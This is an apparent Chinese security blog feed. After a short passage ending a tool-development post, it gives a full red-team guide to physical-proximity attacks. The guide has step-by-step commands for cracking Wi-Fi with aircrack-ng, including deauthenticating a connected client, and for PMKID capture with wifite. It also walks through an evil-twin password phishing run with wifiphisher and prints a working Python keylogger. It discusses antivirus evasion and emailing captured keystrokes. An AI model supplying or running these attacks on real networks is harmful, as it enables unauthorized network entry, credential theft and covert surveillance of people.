<p>到这基本上工具就写完了，这个算是比较简单的工具，开发思路也比较简单，也没用到什么奇奇怪怪的操作，基本上都是基础语法，挺适合小白上手工具开发的，</p>
<p>排版完面板之后把功能加入到各个按钮事件里面导出称jar文件，运行就可以用了，当然在编译器了也可以直接使用，看个人选择吧。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20220106231423032-16414820643301.png" alt="image-20220106231423032"></p>
<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>总的来说，开发工具其实没什么难度，把每一块拆分成多个小点去完成，然后拼接起来就行了，第一次写这种关于工具开发的文，有些可能没表达到位，我尽量把需要注意的地方给写出来，这个是针对于小白的，所以有些简单的东西还是选择说得仔细点，大佬们可以选择性的跳一跳，这个是第一篇，后面的话会根据自己平时开发的一些插件，工具啥的写一些开发思路或者教程，后面可能就不会讲面板这些东西了，如果有那里写得不对的，希望大佬们带带我。</p>
]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>近源攻击方式总结</title>
    <url>/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间身边的大佬去搞攻防，近源攻击挺有成效的，拿了上千的分数，之前自己也有搞过但是一直没用到攻防上面，整理下相关的方式，后续可以参考参考，近源攻击，顾名思义😏你走近点打他，攻击队通过靠近或者位于攻击目标内部，利用各类智能设备、通信技术、物理接口等方法进行突破，也就是说，攻防期间，除了待在小黑屋里面坐牢，还可以接近目标现场，通过现场的环境进行渗透突破，达到进入内网，获取数据的目的，比起在网上打点，近源攻击能够又快又准的进入目标内网，且方法多种多样，成功率很高，但是有点随缘，运气不好的话，可能你丢的Badusb被保洁阿姨丢掉了或者被保安抓了也不一定，关键还是运气和苟住🤔</p>
<span id="more"></span>
<h1 id="近源攻击方式-amp-amp-工具"><a href="#近源攻击方式-amp-amp-工具" class="headerlink" title="近源攻击方式&amp;&amp;工具"></a>近源攻击方式&amp;&amp;工具</h1><p>Badusb：利用HID，也就是计算机直接与人交互的设备，例如键盘、鼠标等进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。</p>
<p>WIFI破解：通过使用外接无线网卡配合kali破解无线密码，现在一般是通过抓握手包然后通过跑包来破解，通过破解WiFi密码来连接目标网络，直接进入内网环境。</p>
<p>WIFI钓鱼：通过创建或者伪造wifi等待目标现场的工作人员进行连接，等工作人员连接上去之后通过分析数据包获取工作人员的上网信息或者内部wifi密码</p>
<p>电磁脉冲干扰（EMP干扰）：开锁利器，目前很多部门对于重要地点大多都是使用智能电子锁，不过当前电子设备和电路的工作频率不断提高，而工作电压却逐渐降低，因此对电磁脉冲（EMP）的敏感性和易损性也不断增加。同时，电子系统中的集成电路对电磁脉冲比较敏感，往往一个较大的电磁脉冲，就会使集成块产生误码、甚至电子元器件失效或烧毁，可以通过使用EMP干扰来打开部分电子门禁和电子密码锁。</p>
<p>变色龙（Chameleon Mini）：Chameleon Mini可以完全复制许多商业非接触式智能卡包括UID卡在内的全部内容，因此可以用来测试RFID和NFC设备在各种攻击环境下的安全性。</p>
<p>Proxmark 3：如果使用EMP无法打开门禁，还可以通过接近一下目标，找合适的机会破解IC卡或复制ID卡。对于ID卡，仅需不到一秒即可复制，而如果是存在MFOC漏洞的IC卡，需要十几秒钟时间复制，可谓攻敌利器。</p>
<p>纳米指纹膜：通过指纹拓印出一个跟原指纹一模一样的指纹膜，用于打开指纹锁或者手机锁屏等，看过谍战警匪片的大铁子们都知道的，拿了谁谁谁的指纹，然后现场畅通无阻😏不过搞不好就进去了，到时候还得要网安的人来捞人。</p>
<p>键盘记录器：能够针对外接的USB键盘，通过将键盘记录器放置到电脑和USB的之间，能够获取到用户在键盘上敲的数据。</p>
<p>光明正大(潜入)现场插网线：很好理解哈，就是偷跑到客户现场，把网线插到自己的电脑上，这样就能获取到内网的网络配置等信息，直接开始内网渗透，或者能够找到忘记锁或者没有账号密码，容易破解的主机也是一种办法，之前有师傅参加的攻防里头就用了这个，对于一些部门来说，管控没那么严格，你能进他的办公园区或者大楼，他们在里面逛了几圈，拿了几千分，缺点也很明显，容易被抓。</p>
<h1 id="相关方式实现过程"><a href="#相关方式实现过程" class="headerlink" title="相关方式实现过程"></a>相关方式实现过程</h1><h2 id="WIFI破解"><a href="#WIFI破解" class="headerlink" title="WIFI破解"></a>WIFI破解</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">wifi破解有三种方式分别是：万能钥匙，字典破解，pin码爆破</span><br></pre></td></tr></table></figure>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>万能钥匙：类似于密码共享，当这个wifi环境下，有人刚好也使用了这个APP，并且把密码共享出去，那么当有人再次访问这个wifi的时候，APP会将密码发生给手机，如果服务器上不存在这个wifi的密码的时候，会尝试进行弱口令爆破，针对于一些公共场所，这个方法还有成功的可能，而对于一些政府部门，这个方法成功率为零。</p>
<p>字典破解：算是比较高级的方法，通过监听wifi的数据包 ，然后当有人连接wifi的时候，记录握手过程，然后通过字典进行对比，匹配出密码，当这个wifi已经有人连接的时候，没有办法抓到握手包，而现在的WiFi设备为了提供更好的用户体验都会再WiFi断线后尝试自动连接。在自动连接的过程中，手机等 设备会重新向路由器发送加密过后的WiFi密码，当路由器接收到这些信息后会将这些信息同自己内部存储的WiFi密码经过相同加密方式后的数据进行对比， 比对成功就算认证通过，那么可以尝试将已经连接的用户踢下线，让他重新连接，当被踢下线的用户重新连接就能进行监听抓包了。</p>
<p>pin码破解：pin其实依赖于路由的wps。就是只要你按一下WPS 按钮就能连接上WiFi的功能，省去了输密码的麻烦。这本来是个方便用户使用的功能，但是它其实是通过了pin码的方式进行了认证。Pin码认证通过后， 路由就会将密码以明文方式发送给你的网络设备，你的网络设备将自动记录和保存WiFi密码并连接上路由器。Pin码一共8位数，分前4和后4，路由先验证 前四位数是否正确，正确的话才会验证后四位，其实后4位的3位确定后，最后一位也就确定了，所以一共也就11000种可能。当然也不是说pin码就一定能百分比破解，如果关闭了wps功能或者路由器有防pin的功能，就很难进行破解，而且这种只针对老型号的路由器，新的路由器基本上都对pin爆破有防范了，而且有的都是默认关闭wps的。</p>
<h3 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h3><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">支持监听的网卡（最好是8187或者3070的）</span><br><span class="line">kali</span><br></pre></td></tr></table></figure>

<h4 id="airodump-ng实现过程"><a href="#airodump-ng实现过程" class="headerlink" title="airodump-ng实现过程"></a>airodump-ng实现过程</h4><p>网卡插入物理机，然后连接到虚拟机上</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170226021.png" alt="image-20220626170226021"></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170411962.png" alt="image-20220626170411962"></p>
<p>查看网卡是否接入成功，记住自己的网卡名，方便寻找</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#提升权限</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="meta">#查看网卡</span></span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170613467.png" alt="image-20220626170613467"></p>
<p>如果没发现的话，看下VMware上的虚拟机里面的可移动设备是不是连接了网卡，如果不是连接一下，还不行的话看下自己买的网卡是不是支持kali或者是不是免驱的，这里注意一点就是，有些网卡虽然支持监听，但是不是免驱的，就有点麻烦，有些良心的会把驱动带上，直接安装就行了，有些是需要你自己去找驱动的，避免踩坑，网上帖子说的那种十几二十块的网卡，我是没买到过，我这个是50多（不知道有没有被坑），但是发射范围不大，只能作为实验或者说你去到人家楼下能够监听到网络的范围，不然的话可以买军工级别的，某鱼上面偶尔会有军工级别的放出来，用来钓鱼的话完全没问题，发射范围好几条街</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626170904261.png" alt="image-20220626170904261"></p>
<p>如果一切正常，检测到了网卡的存在，接着开启下网卡的监控，不开启的话是没办法进行监听的，有一些工具开启之后会帮你打开这个东西</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启网卡监控</span></span><br><span class="line"><span class="attribute">airmon</span>-ng start wlan<span class="number">0</span>（这个位置是根据的你interface名称来的）</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223327574.png" alt="image-20220626223327574"></p>
<p>此时网卡名称变化，可以使用命令看看网卡的名字是否改变</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223404634.png" alt="image-20220626223404634"></p>
<p>此时已经开启了网卡的监控，可以开始扫描现场存在的wifi了</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">airodump</span>-ng wlan<span class="number">0</span>mon（你网卡改变后的名字）</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626223538554.png" alt="image-20220626223538554"></p>
<p>这里停止监听，选择名为AX的wifi进行破解</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224005071.png" alt="image-20220626224005071"></p>
<p>输入以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">airodump</span>-ng -w freedom -c <span class="number">1</span> --bssid <span class="number">48</span>:<span class="number">2</span>C:A<span class="number">0</span>:F<span class="number">2</span>:BF:D<span class="number">0</span> wlan<span class="number">0</span>mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>

<p>其中命令参数为</p>
<p>-c：指定信道<br>-w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br>–bssid：指定路由器的MAC</p>
<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224233602.png" alt="image-20220626224233602"></p>
<p>执行之后会到以下界面</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224430849.png" alt="image-20220626224430849"></p>
<p>如果没连接的设备，就没办法接着往下的步骤了，所以这块还是比较看缘分的，从数据中看出有一台设备在连接，然后接着把这个用户踢下线，然后监听他重新连接的握手包，运行以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aireplay</span>-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="number">48</span>:<span class="number">2</span>C:A<span class="number">0</span>:F<span class="number">2</span>:BF:D<span class="number">0</span> -c <span class="number">0</span>A:FD:D<span class="number">4</span>:<span class="number">19</span>:<span class="number">1</span>A:<span class="number">04</span> wlan<span class="number">0</span>mon</span><br><span class="line"><span class="attribute">aireplay</span>-ng -<span class="number">0</span> <span class="number">2</span> -a （wifi的mac） -c （连接设备的mac） wlan<span class="number">0</span>mon</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626224907122.png" alt="image-20220626224907122"></p>
<p>执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解，这里我们模拟下重新连接这个wifi</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225111090.png" alt="image-20220626225111090"></p>
<p>如果出现上面的数据，则证明我们监听到了握手包，可以接着进行爆破了，ctrl+c退出抓包，数据包保存在主目录下，名字为freedom-01.ivs的文件</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225410953.png" alt="image-20220626225410953"></p>
<p>01是我之前测试的数据包，02是现在的，我们使用02的进行爆破，字典一定要够强大！！！执行以下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aircrack</span>-ng -w pass.txt freedom-<span class="number">02</span>.ivs</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626225813021.png" alt="image-20220626225813021"></p>
<p>爆破成功的话就跟上面一样，其实就跟网页爆破弱口令一样，看你自己的字典强度，到了这，我们就算进入对方网络环境了，可以开始扫描同网络环境下存在的主机了，如果不成功的话就是下面这种，平时多攒攒口令，关键时候口令能帮上大忙。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220626230044050.png" alt="image-20220626230044050"></p>
<h4 id="wifite实现过程"><a href="#wifite实现过程" class="headerlink" title="wifite实现过程"></a>wifite实现过程</h4><p>这个跟上面的airmon-ng是差不多的原理，都是监听-抓包-跑包对比字典的样子，这个会比较一体化，你只需要开启wifite然后选择自己想要监听爆破的wifi，他自己就会进行监听并且不断将已经连接的用户逼下线，通过让用户重新连接去抓取连接时的数据包，然后不断对比字典中的密码，你只需要保证你的字典足够强大就行了，算是很方便的了。</p>
<p>开启wifite，直接kali输入wifite就能启动然后开始监听（如果你插了网卡的话）</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220629154633466.png" alt="image-20220629154633466"></p>
<p>看上面报错了，提示缺了三个东西</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[!] <span class="built_in">Warning</span>: Recommended app pyrit was <span class="keyword">not</span> <span class="built_in">found</span>. install @ https://github.com/JPaulMora/Pyrit/wiki</span><br><span class="line"> [!] <span class="built_in">Warning</span>: Recommended app hcxdumptool was <span class="keyword">not</span> <span class="built_in">found</span>. install @ apt install hcxdumptool</span><br><span class="line"> [!] <span class="built_in">Warning</span>: Recommended app hcxpcapngtool was <span class="keyword">not</span> <span class="built_in">found</span>. install @ apt install hcxtools</span><br></pre></td></tr></table></figure>

<p>这里需要把缺少的东西下载完</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo apt install hcxdumptool </span><br><span class="line">apt install hcxtools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install libpcap-dev sudo apt-<span class="built_in">get</span> install python2.<span class="number">7</span>-dev libssl-dev zlib1g-dev libpcap-dev </span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/JPaulMora/Pyrit.git</span><br><span class="line"><span class="keyword">cd</span> Pyrit</span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> clean </span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> build </span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> install </span><br></pre></td></tr></table></figure>

<p>然后 就没提示缺少了，可以直接监听</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220629164002842.png" alt="image-20220629164002842"></p>
<p>出现你想要的WiFi之后，按ctrl+c停止监听，然后输入前面的序号，就可以开始爆破了</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630094022818.png" alt="image-20220630094022818"></p>
<p>这里我们选择AX的wifi，然后开始捕获PMKID，是几年前比较新的一种用来破解无线密码的WPA/WPA2协议密码的方法，在之前的那些方法中，攻击者需要捕获用户连接路由器时的完整握手包。而新的方法可以在没有客户端的情况下，向AP发送请求来获取PMKID以用于破解，而且在研究员的文章中表示该攻击适用于所有支持并开启漫游功能（Roaming）的无线网络，具体不清楚到底会对多少路由器有效。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630094100830.png" alt="image-20220630094100830"></p>
<p>然后有大表哥研究过在实际情况下对周围环境的攻击能有多大的收获，最后在经过家庭环境和办公环境的对比之后得到这样的结论</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>.该攻击方式并没有明显降低攻击WPA/WPA<span class="number">2</span>网络的难度，依然需要字典式进行暴力破解，只是允许在无客户端情况下进行。</span><br><span class="line"><span class="attribute">2</span>.该攻击只对WPA-PSK/WPA<span class="number">2</span>-PSK有效，对企业级<span class="number">802</span>.<span class="number">1</span>X认证热点（WPA-Enterprise）无效。</span><br><span class="line"><span class="attribute">3</span>.大部分低端家用级路由器由于不支持漫游特性，对该攻击免疫；少部分中高端路由器（往往支持<span class="number">802</span>.<span class="number">11</span>AC）可能受影响，用不上就关掉吧（如果可以的话）。</span><br><span class="line"><span class="attribute">4</span>.对于用户：依然是提高无线密码复杂度，警惕热点密码分享APP。</span><br><span class="line"><span class="attribute">5</span>.对于路由器厂商：对WPA-PSK考虑是否有支持漫游特性的必要，或者增加开关。</span><br></pre></td></tr></table></figure>

<p>如果没捕获到PMKID，就会提示PMKID CAPTURE: Failed to capture PMKID，然后进行数据包的监听，当有用户连接进来的时候就会产生握手包，然后去跑字典。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630151652752.png" alt="image-20220630151652752"></p>
<p>现在就等它破解成功就行了，不过这个有点玄学，我试了好几次，用了几台设备才破解成功一次（密码是12345678）不可能搞不到，虽然说一条龙服务，但是不成功的几率还是太大了，所以第一种的方式会好点，如果没时间盯着的可以选择这一招。</p>
<h2 id="WIFI钓鱼"><a href="#WIFI钓鱼" class="headerlink" title="WIFI钓鱼"></a>WIFI钓鱼</h2><h3 id="wifiphisher"><a href="#wifiphisher" class="headerlink" title="wifiphisher"></a>wifiphisher</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>wifiphisher会针对在攻击中选择的wifi进行强制连接，然后使连接目标wifi的客户机都下线，再通过自身的网卡发射一个伪装好的wifi，并显示钓鱼页面，然后获取到被攻击wifi的密码，相比起自己发射个wifi，然后诱导现场工作人员来连接这个wifi获取上网信息的钓鱼不同，他的成功率会更高点，而且在近源攻击中， 接近的都是安全意识较强的人群，凭空出现一个热点，很少会有人去连接，而且我们的目的是进入对方内网，我自己发射个热点虽然能够监测到上网信息，但是能不能进内网还得看人品，所以，wifiphisher相对来说好一点。</p>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>安装wifiphisher，执行以下命令（网卡接入部分就不用说了，上面有）</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> wifiphisher</span><br><span class="line">cd Wifiphisher <span class="comment"># 切换到 tools 目录</span></span><br><span class="line">sudo python setup.py <span class="keyword">install</span> <span class="comment"># 安装依赖</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630160631978.png" alt="image-20220630160631978"></p>
<p>安装完成之后，把wifiphisher打开就可以开始选择热点进行钓鱼，执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wifiphisher</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161148697.png" alt="image-20220630161148697"></p>
<p>接着就会进入监听状态，查看附近有什么信号源，跟其他的工具差不多，都会把信道，连接数量显示出来，这里尽量选择已经有连接的wifi，不然没人连接的得等到啥时候</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161229339.png" alt="image-20220630161229339"></p>
<p>然后使用鼠标滚轮或者小键盘的方向键，上上下下寻找你要攻击的wifi，这里我们继续选择AX这个wifi，回车确定就会出现you have selected AX</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220630161616641.png" alt="image-20220630161616641"></p>
<p>接下来是选择攻击模式，网络管理器连接，就是模拟wifi连接失败，然后需要重新连接认证这样获得密码</p>
<p>请求预共享密钥。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104553982.png" alt="image-20220701104553982"></p>
<p>然后就会跳转到这个页面下，显示已经连接的用户，已经进入钓鱼页面的用户还有监听到的密码数据</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701103901610.png" alt="image-20220701103901610"></p>
<p>看下用户端的情况，当我们开始钓鱼的时候，wifiphisher会发射一个跟被攻击wifi的名称一样的wifi，然后用户就会莫名其妙的下线了，需要重新连接，然后会跳出一个认证页面</p>
<img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104036604.png" alt="image-20220701104036604" style="zoom: 33%;">

<p>接着当用户输入密码进行验证之后，我们就得到了原来wifi的密码了，又一次顺利进入内网😏如果他不信这个，点击了取消的话，页面就会提示这个无线局域网尚未接入互联网，可以说是很逼真了，对付一般的工作人员还是有用的，而且对于政府部门，医院这种，你自己发射个wifi信号出去，能够钓到人，但没准是来办业务的人呢？你监听不到什么有用的数据，所以这种方式会更加有优势一点。</p>
<img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220701104933764.png" alt="image-20220701104933764" style="zoom:33%;">

<h2 id="键盘记录器"><a href="#键盘记录器" class="headerlink" title="键盘记录器"></a>键盘记录器</h2><p>键盘记录器从字面上来解释，就是记录监控输入的仪器，可监控到键盘的每一次敲击，有基于硬件和软件两种类型。很多时候会被用于不正当的用途，用来盗取别人的密码信息。可能是通过U口插入的U盘，或者是网络上通过邮件，网页链接，聊天软件来进行传播的。</p>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><p>屏幕键盘记录精灵，该电脑键盘记录软件当启动监控后，键盘将详细的记录电脑上的一举一动。适用于所有应用程序，如QQ,MSN,Skype,word,excel,记事本，写字板，IE页面等任何键盘输入程序并发送到指定的邮箱内，软件功能包括：键盘的所有输入输出，定时截取屏幕图片保存到指定文件夹内，定时将记录下来的图片和文本发送到指定邮箱，电脑重启后软件能够自动隐藏运行</p>
<p>网上百度一大堆，大部分是没免杀的，而且都要注册码，要我掏钱还不如噶我腰子，这里运气好找到个可以试用的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165137551.png" alt="image-20220707165137551"></p>
<p>开启监控之后随便敲几下键盘，然后查看记录，可以看到我们刚刚敲的东西</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165256622.png" alt="image-20220707165256622"></p>
<p>其实还能定时截图的，每隔五秒就会截图一次</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707165538794.png" alt="image-20220707165538794"></p>
<p>功能挺完善的，还能定时把数据发送到指定邮箱，并且删除掉数据，把数据删除就不会因为截图太多把占用太多内存，引起怀疑，缺点就是没有免杀，如果免杀了的话，也算是个利器来的，有条件的大佬也可以自己用py写个脚本，类似于这种</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># 记录</span></span><br><span class="line"><span class="keyword">from</span> pynput <span class="keyword">import</span> keyboard, mouse</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">&#x27;monitor.log&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span>(<span class="params">key</span>):</span></span><br><span class="line">    logger.debug(<span class="string">f&#x27;键盘输出：<span class="subst">&#123;key&#125;</span> &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_release</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> key == keyboard.Key.esc:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="keyword">with</span> keyboard.Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> lsn:</span><br><span class="line">        lsn.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_click</span>(<span class="params">x, y, button, pressed</span>):</span></span><br><span class="line">    <span class="keyword">if</span> button == mouse.Button.left:</span><br><span class="line">        logger.debug(<span class="string">&#x27;鼠标左键点击&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> button == mouse.Button.right:</span><br><span class="line">        logger.debug(<span class="string">&#x27;鼠标右键点击&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logger.debug(<span class="string">&#x27;mid被点击&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">    <span class="keyword">with</span> mouse.Listener(on_click=on_click) <span class="keyword">as</span> listener:</span><br><span class="line">        listener.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=f1)</span><br><span class="line">    t2 = Thread(target=f2)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220707172039548.png" alt="image-20220707172039548"></p>
<p>后续再进行扩展，通过发送到邮箱等方式获取信息，灰鸽子，CS都有类似的功能，但大概率会被发现，没有硬件设备隐蔽。</p>
